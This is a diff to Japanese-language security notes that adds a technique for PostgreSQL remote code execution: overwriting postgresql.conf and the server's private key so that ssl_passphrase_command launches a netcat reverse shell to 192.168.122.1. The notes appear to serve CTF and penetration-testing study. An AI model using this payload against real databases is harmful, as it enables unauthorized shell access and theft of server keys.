@@ -132,7 +132,17 @@ create function connect_back(text, integer) returns void as '../data/poc', 'conn
 ```
 https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html  
 ここにはそのためのExploitソースもある。よさそう。  
-##
+
+## Overwrite postgresql.conf to ReverseShell
+https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html  
+`/etc/postgresql/10/main/postgresql.conf`と秘密鍵をパスフレーズ付きのモノに上書きして、`ssl_passphrase_command `をセットすることでコマンド実行するやり方。  
+```txt
+ssl_key_file = '/var/lib/postgresql/11/main/PG_VERSION'
+ssl_passphrase_command_supports_reload = on
+ssl_passphrase_command = 'bash -c "test -p /dev/shm/pipe || mkfifo /dev/shm/pipe; nc 192.168.122.1 8000 < /dev/shm/pipe | /bin/bash > /dev/shm/pipe & echo passphrase; exit 0"'
+```
+Windowsでは`postgresql.conf`は編集できないらしくてうまく行かないらしい。Unix用のやり方？  
+サーバー上の秘密鍵をいったん取得して、それに攻撃者側で`openssl rsa -aes256 -in private.key -out private_passphrase.key`でパスフレーズを付与した秘密鍵を生成して、そのアップデートした秘密鍵をサーバー上の`postgres`ユーザが書き込み権限を持っている`/var/lib/postgresql/11/main/PG_VERSION`に書き込んでいる。  
 
 # writeup
 ## blind / identify admin's password (TJCTF 2020  Weak Password)
